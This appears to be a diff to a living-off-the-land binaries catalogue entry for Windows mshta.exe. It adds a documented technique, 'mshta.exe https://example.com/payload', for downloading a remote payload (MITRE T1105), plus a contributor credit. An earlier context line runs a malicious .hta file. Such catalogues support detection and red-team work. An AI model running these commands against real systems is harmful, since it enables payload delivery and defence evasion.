@@ -1,7 +1,7 @@
 ---
 Name: Mshta.exe
 Description: Used by Windows to execute html applications. (.hta)
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
   - Command: mshta.exe evilfile.hta
@@ -32,6 +32,13 @@ Commands:
     Privileges: User
     MitreID: T1218.005
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)
+  - Command: mshta.exe https://example.com/payload
+    Description: It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE)
+    Usecase: Downloads payload from remote server
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\mshta.exe
   - Path: C:\Windows\SysWOW64\mshta.exe
@@ -69,3 +76,5 @@ Acknowledgement:
     Handle: '@subtee'
   - Person: Oddvar Moe
     Handle: '@oddvarmoe'
+  - Person: Nir Chako (Pentera)
+    Handle: '@C_h4ck_0'
